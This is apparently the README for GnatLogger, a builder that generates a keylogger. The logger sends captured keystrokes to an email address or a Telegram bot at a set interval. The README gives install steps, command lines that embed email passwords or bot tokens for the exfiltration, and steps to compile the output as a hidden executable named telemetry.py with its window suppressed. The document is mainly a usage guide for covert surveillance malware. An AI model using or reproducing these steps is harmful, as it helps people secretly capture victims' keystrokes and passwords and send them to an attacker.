# GnatLogger

### How to install GnatLogger  
`git clone https://github.com/UndeadSec/GnatLogger.git`

`python3 -m venv env`

Activate environment  

`.\env\Scripts\activate.bat`

Install requirements  

`pip install -r requirements.txt`

### Using GnatLogger   

[CLI] Generate script python with your configs using option email

`python gnatlogger.py --force -e youremail@gmail.com -p emailpassword -i 30 -to sentoemail@gmail.com --enableemail`

`--force` Use this option to generate the file without all the necessary arguments.

[CLI] Generate using option Telegram

`python gnatlogger.py --force --uid 990911 -k 203040:YOUTOKENXJK$3 --interval 30 --enabletelegram `  

[Interactive mode]

Just use `python gnatlogger.py` without `--force`

You can use the cli parameters for use in interactive mode

`python gnatlogger.py --uid 990911 -k 203040:YOUTOKENXJK$3 --interval 30`

Then finish setting the variables in interactive mode

### Finally 

Enter on interactive mode and compile the script telemetry.py using option `C`(without debug pyinstaller) or `D`(with debug pyinstaller)

To debug, comment the line `Hide()`

@TODO: Compile script to exe using cli


### Usage  

```
usage: gnatlogger.py [-h] [-e EMAIL] [-p PASSWORD] [-i INTERVAL] [-t TO] [-d DEBUG] [-u UID] [-k TOKEN]
                     [--enabletelegram] [--enableemail] [--force]

Set configs to gerenerate a new file

options:  
  -h, --help            show this help message and exit
  -e EMAIL, --email EMAIL
                        set a new email
  -p PASSWORD, --password PASSWORD
                        set a new password
  -i INTERVAL, --interval INTERVAL
                        set a new interval
  -t TO, --to TO        set send to email
  -d DEBUG, --debug DEBUG
                        Enable debug loggs on gnatlogger script, use DEBUG
  -u UID, --uid UID     uid telegram @myidbot
  -k TOKEN, --token TOKEN
                        token bot telegram
  --enabletelegram      enable telegram as send form
  --enableemail         enable email as send form
  --force               disable interactive and force generate file
  ```
